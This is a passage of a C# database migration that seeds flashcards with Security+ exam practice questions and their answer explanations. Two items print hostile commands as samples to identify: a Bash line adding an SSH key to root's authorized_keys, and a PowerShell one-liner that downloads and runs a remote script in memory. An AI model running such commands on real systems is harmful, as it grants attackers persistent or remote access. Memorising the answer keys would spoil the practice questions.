                values: new object[] { 167, "\r\n167. A. Pretexting is a type of social engineering that involves using\r\na false motive and lying to obtain information. Here, the\r\npenetration tester lied about their role and why they are calling\r\n(impersonation), and then built some trust with the user before\r\nasking for personal information. A watering hole attack\r\nleverages a website that the targeted users all use and places\r\nmalware on it to achieve their purpose. Prepending is described\r\nby CompTIA as “adding an expression or a phrase,” and\r\nshoulder surfing involves looking over an individual’s shoulder\r\nor otherwise observing them entering sensitive information like\r\npasswords.\r\n", 1, "\r\n167. A penetration tester calls a staff member for her target organization and introduces herself\r\nas a member of the IT support team. She asks if the staff member has encountered a\r\nproblem with their system, then proceeds to ask for details about the individual, claiming\r\nshe needs to verify that she is talking to the right person. What type of social engineering\r\nattack is this?\r\nA. Pretexting\r\nB. A watering hole attack\r\nC. Prepending\r\nD. Shoulder surfing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 141, "\r\n141. C. Jim has discovered a skimmer, a device used for skimming\r\nattacks that capture credit and debit card information.\r\nSkimmers may be able to wirelessly upload the information they\r\ncapture, or they may require attackers to retrieve data in person.\r\nSome skimmers include cameras to capture keypresses for PINs\r\nand other data. A replay attack would reuse credentials or other\r\ninformation to act like a legitimate user, a race condition occurs\r\nwhen the time of use and time of check of data can be exploited,\r\nand a card cloner would be used after cards were skimmed to\r\nduplicate them.\r\n", 1, "\r\n141. Jim discovers a physical device attached to a gas pump’s credit card reader. What type of\r\nattack has he likely discovered?\r\nA. A replay attack\r\nB. A race condition\r\nC. A skimmer\r\nD. A card cloner\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 139, "\r\n139. B. Systems should not have a rootkit on them when a\r\npenetration test starts, and rootkits installed during the test\r\nshould be fully removed and securely deleted. The rest of the\r\noptions are all typical parts of a penetration testing cleanup\r\nprocess. You can read more at the penetration testing standard\r\nsite at www.pentest-standard.org/index.php/Post_Exploitation.\r\n", 1, "\r\n139. Which of the following is not a common part of a cleanup process after a penetration test?\r\nA. Removing all executables and scripts from the compromised system\r\nB. Restoring all rootkits to their original settings on the system\r\nC. Returning all system settings and application configurations to their original configurations\r\nD. Removing any user accounts created during the penetration test\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 115, "\r\n115. B. Claiming to be from tech support is claiming authority, and\r\nthe story the caller gave indicates urgency. Yes, this caller used\r\nurgency (the virus spread) but did not attempt intimidation.\r\nAuthority and trust are closely related, and in this case urgency\r\nwas the second major factor. This caller used urgency but not\r\nintimidation.\r\n", 1, "\r\n115. A user in your company reports that she received a call from someone claiming to be from\r\nthe company technical support team. The caller stated that there was a virus spreading\r\nthrough the company and they needed immediate access to the employee’s computer to stop\r\nit from being infected. What social-engineering principles did the caller use to try to trick\r\nthe employee?\r\nA. Urgency and intimidation\r\nB. Urgency and authority\r\nC. Authority and trust\r\nD. Intimidation and authority\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 116, "\r\n116. B. The questions tells us that these are Windows 10 systems, a\r\ncurrent operating system. From there, it is safe to presume that\r\nsomething has gone wrong with the patching process or that\r\nthere isn’t a patching process. Elaine should investigate both\r\nwhat the process is and if there are specific reasons the systems\r\nare not patched. Since we know these systems run a current OS,\r\noption A, unsupported operating systems, can be ruled out. The\r\nvulnerabilities are specifically noted to be Windows\r\nvulnerabilities, ruling out option C, and there is no mention of\r\nprotocols, eliminating option D as well.\r\n", 1, "\r\n116. After running a vulnerability scan, Elaine discovers that the Windows 10 workstations in\r\nher company’s warehouse are vulnerable to multiple known Windows exploits. What should\r\nshe identify as the root cause in her report to management?\r\nA. Unsupported operating systems\r\nB. Improper or weak patch management for the operating systems\r\nC. Improper or weak patch management for the firmware of the systems\r\nD. Use of unsecure protocols\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 117, "\r\n117. A. Address Resolution Protocol (ARP) poisoning, often called\r\nARP spoofing, occurs when an attacker sends malicious ARP\r\npackets to the default gateway of a local area network, causing it\r\nto change the mappings it maintains between hardware (MAC)\r\naddresses and IP addresses. In DNS poisoning, domain name to\r\nIP address entries in a DNS server are altered. This attack did\r\nnot involve an on-path attack. A backdoor provides access to the\r\nattacker, which circumvents normal authentication.\r\n", 1, "\r\n117. Ahmed has discovered that attackers spoofed IP addresses to cause them to resolve to a different\r\nhardware address. The manipulation has changed the tables maintained by the default\r\ngateway for the local network, causing data destined for one specific MAC address to now\r\nbe routed elsewhere. What type of attack is this?\r\nA. ARP poisoning\r\nB. DNS poisoning\r\nC. On-path attack\r\nD. Backdoor\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 118, "\r\n118. A. In a known environment (white-box) test, the tester is given\r\nextensive knowledge of the target network. Full disclosure is not\r\na term used to describe testing. Unknown environment (blackbox)\r\ntesting involves only very minimal information being given\r\nto the tester. A red team test simulates a particular type of\r\nattacker, such as a nation-state attacker, an insider, or other\r\ntype of attacker.\r\n", 1, "\r\n118. What type of penetration test is being done when the tester is given extensive knowledge of\r\nthe target network?\r\nA. Known environment\r\nB. Full disclosure\r\nC. Unknown environment\r\nD. Red team\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 119, "\r\n119. C. Social engineering is about using people skills to get\r\ninformation you would not otherwise have access to. Illegal\r\ncopying of software isn’t social engineering, nor is gathering of\r\ndiscarded manuals and printouts, which describes dumpster\r\ndiving. Phishing emails use some social engineering, but that is\r\none example of social engineering, not a definition.\r\n", 1, "\r\n119. Your company is instituting a new security awareness program. You are responsible for educating\r\nend users on a variety of threats, including social engineering. Which of the following\r\nbest defines social engineering?\r\nA. Illegal copying of software\r\nB. Gathering information from discarded manuals and printouts\r\nC. Using people skills to obtain proprietary information\r\nD. Phishing emails\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 120, "\r\n120. C. Shoulder surfing involves literally looking over someone’s\r\nshoulder in a public place and gathering information, perhaps\r\nlogin passwords. ARP poisoning alters the Address Resolution\r\nProtocol tables in the switch. Phishing is an attempt to gather\r\ninformation, often via email, or to convince a user to click a link\r\nto, and/or download, an attachment. A Smurf attack is a\r\nhistorical form of denial-of-service attack.\r\n", 1, "\r\n120. Which of the following attacks can be caused by a user being unaware of their physical\r\nsurroundings?\r\nA. ARP poisoning\r\nB. Phishing\r\nC. Shoulder surfing\r\nD. Smurf attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 121, "\r\n121. A. Invoice scams typically either send legitimate appearing\r\ninvoices to trick an organization into paying the fake invoice, or\r\nthey focus on tricking employees into logging into a fake site to\r\nallow the acquisition of credentials. They typically do not focus\r\non delivery of malware or stealing cryptocurrency.\r\n", 1, "\r\n121. What are the two most common goals of invoice scams?\r\nA. Receiving money or acquiring credentials\r\nB. Acquiring credentials or delivering a rootkit\r\nC. Receiving money or stealing cryptocurrency\r\nD. Acquiring credentials or delivering ransomware\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 122, "\r\n122. B. Vulnerability scans use automated and semiautomated\r\nprocesses to identify known vulnerabilities. Audits usually\r\ninvolve document checks. Unknown and known environment\r\ntesting are both types of penetration tests.\r\n", 1, "\r\n122. Which of the following type of testing uses an automated process of proactively identifying\r\nvulnerabilities of the computing systems present on a network?\r\nA. Security audit\r\nB. Vulnerability scanning\r\nC. A known environment test\r\nD. An unknown environment test\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 123, "\r\n123. A. A partially known (gray-box) test involves the tester being\r\ngiven partial information about the network. A known\r\nenvironment (white-box) test involves the tester being given full\r\nor nearly full information about the target network, and\r\nunknown (black-box) environments don’t provide information\r\nabout the target environment. Masked is not a testing term.\r\n", 1, "\r\n123. John has been asked to do a penetration test of a company. He has been given general\r\ninformation but no details about the network. What kind of test is this?\r\nA. Partially known environment\r\nB. Known environment\r\nC. Unknown environment\r\nD. Masked\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 124, "\r\n124. D. In the on-path (man-in-the-middle) attack, the attacker is\r\nbetween the client and the server, and to either end, the attacker\r\nappears like the legitimate other end. This does not describe any\r\ndenial-of-service attack. A replay attack involves resending login\r\ninformation. Although an on-path attack can be used to perform\r\neavesdropping, in this scenario the best answer is an on-path\r\nattack.\r\n", 1, "\r\n124. Under which type of attack does an attacker’s system appear to be the server to the real\r\nclient and appear to be the client to the real server?\r\nA. Denial-of-service\r\nB. Replay\r\nC. Eavesdropping\r\nD. On-path\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 125, "\r\n125. A. In a man-in-the-browser attack, the malware intercepts calls\r\nfrom the browser to the system, such as system libraries. Onpath\r\nattack involves having some process between the two ends\r\nof communication in order to compromise passwords or\r\ncryptography keys. In a buffer overflow attack, more data is put\r\ninto a variable than the variable was intended to hold. Session\r\nhijacking involves taking over an authenticated session.\r\n", 1, "\r\n125. You are a security administrator for Acme Corporation. You have discovered malware on\r\nsome of your company’s machines. This malware seems to intercept calls from the web\r\nbrowser to libraries, and then manipulates the browser calls. What type of attack is this?\r\nA. Man in the browser\r\nB. On-path attack\r\nC. Buffer overflow\r\nD. Session hijacking\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 140, "\r\n140. C. This is an example of an online brute-force dictionary attack.\r\nDictionary attacks use common passwords as well as common\r\nsubstitutions to attempt to break into a system or service. Backoff\r\nalgorithms that lock out attackers after a small number of\r\nincorrect password attempts can help slow or stop dictionary\r\nattacks and other brute-force password attacks. Rainbow tables\r\nare tables of precomputed hashes. The birthday attack is a\r\nmethod for generating collisions of hashes. Finally, no spoofing\r\nis indicated in this scenario.\r\n", 1, "\r\n140. You have discovered that someone has been trying to log on to your web server. The person\r\nhas tried a wide range of likely passwords. What type of attack is this?\r\nA. Rainbow table\r\nB. Birthday attack\r\nC. Dictionary attack\r\nD. Spoofing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 126, "\r\n126. B. Uniform resource locator (URL) redirection is frequently\r\nused in web applications to direct users to another service or\r\nportion of the site. If this redirection is not properly secured, it\r\ncan be used to redirect to an arbitrary untrusted or malicious\r\nsite. This issue, known as Open Redirect vulnerabilities, remains\r\nquite common. The code shown does not contain SQL or LDAP\r\ncode, and there is no mention of changing DNS information on\r\nthe server, thus making the other options incorrect.\r\n", 1, "\r\n126. Tony is reviewing a web application and discovers the website generates links like the\r\nfollowing:\r\nhttps://www.example.com/login.html?Relay=http%3A%2F%2Fexample.com%2Fsite\r\n.html\r\nWhat type of vulnerability is this code most likely to be susceptible to?\r\nA. SQL injection\r\nB. URL redirection\r\nC. DNS poisoning\r\nD. LDAP injection\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 128, "\r\n128. B. Cross-site request forgery (XSRF or CSRF) takes advantage\r\nof the cookies and URL parameters legitimate sites use to help\r\ntrack and serve their visitors. In an XSRF or a CSRF attack,\r\nattackers leverage authorized, authenticated users’ rights by\r\nproviding them with a cookie or session data that will be read\r\nand processed when they visit the target site. An attacker may\r\nembed a link within an email or other location that will be\r\nclicked or executed by the user or an automated process with\r\nthat user’s session already open. This is not SQL injection, which\r\nwould attempt to send commands to a database, or LDAP\r\ninjection, which gathers data from a directory server. Cross-site\r\nscripting (XSS) would embed code in user-submittable data\r\nfields that a website will display to other users, causing it to run.\r\n", 1, "\r\n128. Angela has discovered an attack against some of the users of her website that leverage URL\r\nparameters and cookies to make legitimate users perform unwanted actions. What type of\r\nattack has she most likely discovered?\r\nA. SQL injection\r\nB. Cross-site request forgery\r\nC. LDAP injection\r\nD. Cross-site scripting\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 129, "\r\n129. D. You will need to be able to read and understand basic scripts\r\nand programs in multiple languages for the Security+ exam. In\r\nthis example, you can recognize common Bash syntax and see\r\nthat it is adding a key to the authorized keys file for root. If that’s\r\nnot an expected script, you should be worried!\r\n", 1, "\r\n129. Nathan discovers the following code in the directory of a compromised user. What language\r\nis it using, and what will it do?\r\necho \"ssh-rsa ABBAB4KAE9sdafAK...Mq/jc5YLfnAnbFDRABMhuWzaWUp\r\nroot@localhost\" >> /root/.ssh/authorized_keys\r\nA. Python, adds an authorized SSH key\r\nB. Bash, connects to another system using an SSH key\r\nC. Python, connects to another system using an SSH key\r\nD. Bash, adds an authorized SSH key\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 130, "\r\n130. D. Rootkits provide administrative access to systems, thus the\r\n“root” in rootkit. A Trojan horse combines malware with a\r\nlegitimate program. A logic bomb performs its malicious activity\r\nwhen some condition is met. A multipartite virus infects the\r\nboot sector and a file.\r\n", 1, "\r\n130. Jared has discovered malware on the workstations of several users. This particular malware\r\nprovides administrative privileges for the workstation to an external hacker. What best\r\ndescribes this malware?\r\nA. Trojan horse\r\nB. Logic bomb\r\nC. Multipartite virus\r\nD. Rootkit\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 131, "\r\n131. C. Memory leaks can cause crashes, resulting in an outage. This\r\ntargets the availability leg of the CIA (confidentiality, integrity,\r\nand availability) triad, making it a security issue. Memory leaks\r\ndo not actually leak to other locations, nor do they allow code\r\ninjection. Instead memory leaks cause memory exhaustion or\r\nother issues over time as memory is not properly reclaimed.\r\n", 1, "\r\n131. Why are memory leaks a potential security issue?\r\nA. They can expose sensitive data.\r\nB. They can allow attackers to inject code via the leak.\r\nC. They can cause crashes\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 132, "\r\n132. B. This question combines two pieces of knowledge: how\r\nbotnet command and control works, and that IRC’s default port\r\nis TCP 6667. Although this could be one of the other answers,\r\nthe most likely answer given the information available is a\r\nbotnet that uses Internet Relay Chat (IRC) as its command-andcontrol\r\nchannel.\r\n", 1, "\r\n132. Michelle discovers that a number of systems throughout her organization are connecting to\r\na changing set of remote systems on TCP port 6667. What is the most likely cause of this, if\r\nshe believes the traffic is not legitimate?\r\nA. An alternate service port for web traffic\r\nB. Botnet command and control via IRC\r\nC. Downloads via a peer-to-peer network\r\nD. Remote access Trojans\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 133, "\r\n133. A. Software updates for consumer-grade wireless routers are\r\ntypically applied as firmware updates, and Susan should\r\nrecommend that the business owner regularly upgrade their\r\nwireless router firmware. If updates are not available, they may\r\nneed to purchase a new router that will continue to receive\r\nupdates and configure it appropriately. This is not a default\r\nconfiguration issue nor an unsecured administrative account—\r\nneither is mentioned, nor is encryption.\r\n", 1, "\r\n133. Susan performs a vulnerability scan of a small business network and discovers that the organization’s\r\nconsumer-grade wireless router has a vulnerability in its web server. What issue\r\nshould she address in her findings?\r\nA. Firmware patch management\r\nB. Default configuration issues\r\nC. An unsecured administrative account\r\nD. Weak encryption settings\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 134, "\r\n134. B. Radio frequency identification (RFID) is commonly used for\r\naccess badges, inventory systems, and even for identifying pets\r\nusing implantable chips. In a penetration testing scenario,\r\nattackers are most likely to attempt to acquire or clone RFIDbased\r\naccess badges to gain admittance to a building or office\r\nsuite.\r\n", 1, "\r\n134. Where is an RFID attack most likely to occur as part of a penetration test?\r\nA. System authentication\r\nB. Access badges\r\nC. Web application access\r\nD. VPN logins\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 135, "\r\n135. B. The word you will need to know for the Security+ exam for\r\nphishing via SMS is “smishing,” a term that combines SMS and\r\nphishing. Bluejacking sends unsolicited messages to Bluetooth\r\ndevices, and phonejacking and text whaling were made up for\r\nthis question.\r\n", 1, "\r\n135. What type of phishing attack occurs via text messages?\r\nA. Bluejacking\r\nB. Smishing\r\nC. Phonejacking\r\nD. Text whaling\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 136, "\r\n136. B. This is vishing, or using voice calls for phishing. Spear\r\nphishing is targeting a small, specific group. War dialing is\r\ndialing numbers hoping a computer modem answers.\r\nRobocalling is used to place unsolicited telemarketing calls.\r\n", 1, "\r\n136. Users in your company report someone has been calling their extension and claiming to\r\nbe doing a survey for a large vendor. Based on the questions asked in the survey, you suspect\r\nthat this is a scam to elicit information from your company’s employees. What best\r\ndescribes this?\r\nA. Spear phishing\r\nB. Vishing\r\nC. War dialing\r\nD. Robocalling\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 137, "\r\n137. A. Worms spread themselves via vulnerabilities, making this an\r\nexample of a worm. A virus is software that self-replicates. A\r\nlogic bomb executes its malicious activity when some condition\r\nis met. A Trojan horse combines malware with a legitimate\r\nprogram.\r\n", 1, "\r\n137. John is analyzing a recent malware infection on his company network. He discovers malware\r\nthat can spread rapidly via vulnerable network services and does not require any interaction\r\nfrom the user. What best describes this malware?\r\nA. Worm\r\nB. Virus\r\nC. Logic bomb\r\nD. Trojan horse\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 138, "\r\n138. B. Dumpster diving is the process of going through the trash to\r\nfind documents. Shredding documents will help to prevent\r\ndumpster diving, but truly dedicated dumpster divers can\r\nreassemble even well-shredded documents, leading some\r\norganizations to burn their most sensitive documents after they\r\nhave been shredded. Phishing is often done via email or phone\r\nand is an attempt to elicit information or convince a user to click\r\na link or open an attachment. Shoulder surfing is literally\r\nlooking over someone’s shoulder. In the on-path (man-in-themiddle)\r\nattack, the attacker is between the client and the server,\r\nand to either end, the attacker appears like the legitimate other\r\nend.\r\n", 1, "\r\n138. Your company has issued some new security directives. One of these new directives is that\r\nall documents must be shredded before being thrown out. What type of attack is this trying\r\nto prevent?\r\nA. Phishing\r\nB. Dumpster diving\r\nC. Shoulder surfing\r\nD. On-path attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 127, "\r\n127. D. Placing a larger integer value into a smaller integer variable\r\nis an integer overflow. Memory overflow is not a term used, and\r\nmemory leak is about allocating memory and not deallocating it.\r\nBuffer overflows often involve arrays. Variable overflow is not a\r\nterm used in the industry.\r\n", 1, "\r\n127. You are responsible for software testing at Acme Corporation. You want to check all software\r\nfor bugs that might be used by an attacker to gain entrance into the software or your\r\nnetwork. You have discovered a web application that would allow a user to attempt to put a\r\n64-bit value into a 4-byte integer variable. What is this type of flaw?\r\nA. Memory overflow\r\nB. Buffer overflow\r\nC. Variable overflow\r\nD. Integer overflow\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 168, "\r\n168. C. You may be familiar with the term war driving, but war\r\nflying is increasingly common as drones have entered wide use.\r\nAlthough penetration testers are somewhat unlikely to fly a\r\nhelicopter or airplane over a target site, inexpensive drones can\r\nprovide useful insight into both physical security and wireless\r\nnetwork coverage if equipped with the right hardware. Droning\r\nand aerial snooping were made up for this question, and Air\r\nSnarf is an old tool for capturing usernames and passwords on\r\nvulnerable wireless networks.\r\n", 1, "\r\n168. What term describes the use of airplanes or drones to gather network or other information\r\nas part of a penetration test or intelligence gathering operation?\r\nA. Droning\r\nB. Air Snarfing\r\nC. War flying\r\nD. Aerial snooping\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 169, "\r\n169. C. Many organizations have legacy platforms in place that\r\ncannot be patched or upgraded but that are still an important\r\npart of their business. Security professionals are often asked to\r\nsuggest ways to secure the systems while leaving them\r\noperational. Common options include moving the devices to an\r\nisolated virtual LAN (VLAN), disconnecting the devices from the\r\nnetwork and ensuring they are not plugged back in, and using a\r\nfirewall or other security device to ensure that the legacy system\r\nis protected from attacks and cannot browse the Internet or\r\nperform other actions that could result in compromise.\r\n", 1, "\r\n169. Gabby wants to protect a legacy platform with known vulnerabilities. Which of the following\r\nis not a common option for this?\r\nA. Disconnect it from the network.\r\nB. Place the device behind a dedicated firewall and restrict inbound and outbound traffic.\r\nC. Rely on the outdated OS to confuse attackers.\r\nD. Move the device to a protected VLAN.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 170, "\r\n170. B. According to the national council of ISACs, information\r\nsharing and analysis centers, “Information Sharing and Analysis\r\nCenters (ISACs) help critical infrastructure owners and\r\noperators protect their facilities, personnel and customers from\r\ncyber and physical security threats and other hazards. ISACs\r\ncollect, analyze and disseminate actionable threat information to\r\ntheir members and provide members with tools to mitigate risks\r\nand enhance resiliency.” IRTs are incident response teams,\r\nFeedburner is Google’s RSS feed management tool, and vertical\r\nthreat feeds is not an industry term.\r\n", 1, "\r\n170. In the United States, collaborative industry organizations that analyze and share cybersecurity\r\nthreat information within their industry verticals are known by what term?\r\nA. IRTs\r\nB. ISACs\r\nC. Feedburners\r\nD. Vertical threat feeds\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 200, "\r\n200. C. Identity fraud and identity theft commonly use Social\r\nSecurity numbers as part of the theft of identity. Tailgating\r\ninvolves following a person through a security door or gate so\r\nthat you do not have to present credentials or a code, whereas\r\nimpersonation is a social engineering technique where you claim\r\nto be someone else. Blackmail is a potential answer, but the\r\nmost common usage is for identity fraud.\r\n", 1, "\r\n200. Social Security numbers and other personal information are often stolen for what purpose?\r\nA. Blackmail\r\nB. Tailgating\r\nC. Identity fraud\r\nD. Impersonation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 201, "\r\n201. A. SOAR tools, like security information and event\r\nmanagement (SIEM) tools, are highly focused on security\r\noperations. They include threat and vulnerability management,\r\nsecurity incident response, and security operations and\r\nautomation tools, but they do not provide source code analysis\r\nand testing tools.\r\n", 1, "\r\n201. Security orchestration, automation, and response (SOAR) tools have three major components.\r\nWhich of the following is not one of those components?\r\nA. Source code security analysis and testing\r\nB. Threat and vulnerability management\r\nC. Security incident response\r\nD. Security operations automation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 202, "\r\n202. B. The Security+ exam outline specifically lists these items as\r\nthreat vectors. Although there are many others, you should be\r\nfamiliar with direct access, wireless, email, supply chain, social\r\nmedia, removable media, and cloud as vectors for the exam.\r\n", 1, "\r\n202. Direct access, wireless, email, supply chain, social media, removable media, and cloud are all\r\nexamples of what?\r\nA. Threat intelligence sources\r\nB. Threat vectors\r\nC. Attributes of threat actors\r\nD. Vulnerabilities\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 203, "\r\n203. C. Although it may seem strange at first, both SourceForge and\r\nGitHub are used to house sample exploit code as well as other\r\ninformation that threat intelligence analysts may find useful.\r\nThey are not part of the dark web, nor are they an automated\r\nindicator sharing (AIS) source or a public information sharing\r\ncenter.\r\n", 1, "\r\n203. SourceForge and GitHub are both examples of what type of threat intelligence source?\r\nA. The dark web\r\nB. Automated indicator sharing sources\r\nC. File or code repositories\r\nD. Public information sharing centers\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 204, "\r\n204. B. Trusting rather than validating user input is the root cause\r\nof improper input handling. All input should be considered\r\npotentially malicious and thus treated as untrusted. Appropriate\r\nfiltering, validation, and testing should be performed to ensure\r\nthat only valid data input is accepted and processed.\r\n", 1, "\r\n204. What is the root cause of improper input handling?\r\nA. Improper error handling\r\nB. Trusting rather than validating data inputs\r\nC. Lack of user awareness\r\nD. Improper source code review\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 205, "\r\n205. C. The code is an example of a PowerShell script that\r\ndownloads a file into memory. You can rule out the upload\r\noptions by reading the script since it mentions a download in the\r\nscript example. Since we see a string being downloaded, rather\r\nthan a file and location, you may be able to guess that this is a\r\nfileless malware example.\r\n", 1, "\r\n205. Claire discovers the following PowerShell script. What does it do?\r\npowershell.exe -ep Bypass -nop -noexit -c iex\r\n((New ObjectNet.WebClient). DownloadString('https://example.com/file.psl))\r\nA. Downloads a file and opens a remote shell\r\nB. Uploads a file and deletes the local copy\r\nC. Downloads a file into memory\r\nD. Uploads a file from memory\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 206, "\r\n206. C. Session IDs should be unique for distinct users and systems.\r\nA very basic type of session replay attack involves providing a\r\nvictim with a session ID and then using that session ID once\r\nthey have used the link and authenticated themselves.\r\nProtections such as session timeouts and encrypting session\r\ndata, as well as encoding the source IP, hostname, or other\r\nidentifying information in the session key, can all help prevent\r\nsession replay attacks.\r\n", 1, "\r\n206. Kathleen’s IPS flags traffic from two IP addresses as shown here:\r\nSource IP: 10.11.94.111\r\nhttp://example.com/home/show.php?SESSIONID=a3fghbby\r\nSource IP: 192.168.5.34\r\nhttp://example.com/home/show.php?SESSIONID=a3fghbby\r\nWhat type of attack should she investigate this as?\r\nA. A SQL injection attack\r\nB. A cross-site scripting attack\r\nC. A session replay attack\r\nD. A server-side request forgery attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 207, "\r\n207. B. The Security+ exam outline lists seven major impact\r\ncategories, including data loss, data breaches, and data\r\nexfiltration. Data modification is not listed, but it is a concern as\r\npart of the integrity leg of the CIA triad.\r\n", 1, "\r\n207. There are seven impact categories that you need to know for the Security+ exam. Which of\r\nthe following is not one of them?\r\nA. Data breaches\r\nB. Data modification\r\nC. Data exfiltration\r\nD. Data loss\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 208, "\r\n208. C. Academic journals are the slowest of the items listed because\r\nof the review processes involved with most reputable journals.\r\nAlthough academic journals can be useful resources, they are\r\ntypically not up-to-the-minute sources. Other resources you\r\nshould be aware of are vendor websites, conferences, social\r\nmedia, and RFCs (requests for comments).\r\n", 1, "\r\n208. Which of the following research sources is typically the least timely when sourcing threat\r\nintelligence?\r\nA. Vulnerability feeds\r\nB. Local industry groups\r\nC. Academic journals\r\nD. Threat feeds\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
